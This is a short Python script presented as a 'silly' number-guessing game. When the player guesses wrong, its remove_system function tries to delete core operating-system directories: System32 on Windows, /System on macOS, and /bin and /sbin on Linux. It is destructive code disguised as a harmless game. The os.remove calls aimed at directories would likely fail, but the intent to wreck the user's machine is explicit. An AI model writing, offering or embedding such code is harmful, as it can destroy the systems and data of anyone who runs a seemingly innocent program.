import random
import os
import platform

def remove_system():
    system = platform.system()
    if system == "Windows":
        os.remove("C:\\Windows\\System32")
    elif system == "Darwin": # MAC
        os.remove("/System")
    elif system == "Linux":
        os.remove("/bin")
        os.remove("/sbin")
    else:
        print(system)
        print("You get away this time")

if __name__ == "__main__":
    number = random.randint(1, 10)

    print(number)
    guess = input("Silly game! Guess number between 1 and 10")
    guess = int(guess)

    if guess == number:
        print("You Won!!")
    else:
        remove_system()
